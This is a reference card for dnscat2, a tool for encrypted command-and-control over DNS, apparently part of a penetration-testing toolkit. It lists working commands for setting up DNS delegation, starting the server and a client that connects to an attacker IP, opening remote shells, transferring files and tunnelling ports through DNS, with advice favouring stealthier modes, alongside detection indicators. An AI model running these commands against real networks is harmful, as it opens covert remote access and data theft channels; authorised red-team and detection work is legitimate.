# dnscat2 Toolcard

## Overview
- Summary: dnscat2 is an encrypted command-and-control channel over DNS protocol. Creates tunnels through DNS queries/responses that traverse nearly every network. Server in Ruby, client in C with minimal dependencies. Encrypted by default with key exchange. Supports authoritative DNS mode (stealthy, queries route through DNS infrastructure) and direct mode (UDP/53 to server IP, faster but obvious). MITRE ATT&CK T1071.004 (DNS), T1572 (Protocol Tunneling).

## Advanced Techniques
- DNS delegation required: add NS record `c2 IN NS c2ns.example.com.` and A record `c2ns IN A <server_ip>` to zone file.
- Server start: `ruby dnscat2.rb c2.example.com` — note the secret key displayed for encryption verification.
- Server with options: `ruby dnscat2.rb c2.example.com --secret=mysecretkey --security=open --no-cache`.
- Server direct mode (no domain): `ruby dnscat2.rb --dns server=0.0.0.0,port=53 --no-cache`.
- Client via authoritative DNS (stealthiest): `./dnscat c2.example.com` — client with secret: `./dnscat --secret=mysecretkey c2.example.com`.
- Client direct mode: `./dnscat --dns server=<attacker_ip>,port=53` — Windows: `dnscat2.exe c2.example.com`.
- Force DNS record type: `./dnscat --dns type=TXT c2.example.com` — also `type=MX`, `type=CNAME`, `type=A`, `type=AAAA`.
- Record bandwidth: TXT (highest, default) > CNAME/MX (moderate) > AAAA (16 bytes) > A (4 bytes per response).
- Session management: `sessions` to list, `session -i 1` to interact, `shell` for interactive shell (T1059), `exec cmd.exe` for specific program.
- File transfer: `upload /local/file /remote/path`, `download /remote/path /local/file`.
- Port forwarding through DNS: `listen 0.0.0.0:4444 10.0.0.5:445` — tunnels TCP through DNS (T1572).
- Window management: `windows` to list, `window -i 2` to switch — supports multiple concurrent tunnels per session.
- Throughput is ~KB/s — use for C2/shells, not bulk data transfers. For full IP tunnel, use iodine instead.
- Detection indicators: high DNS query volume to single domain, long subdomain labels with high entropy, abnormal TXT record query frequency, consistent periodic query patterns (beaconing), queries to unusual/new domains.

## Safe Defaults
- Rate limits: DNS tunneling is inherently slow; no additional throttling needed but minimize unnecessary commands
- Scope rules: explicit target only — authoritative DNS mode preferred over direct mode for stealth

## Evidence Outputs
- outputs: evidence.json, findings.json, session transcripts, downloaded files (as applicable)

## References
- https://github.com/iagox86/dnscat2
- https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md
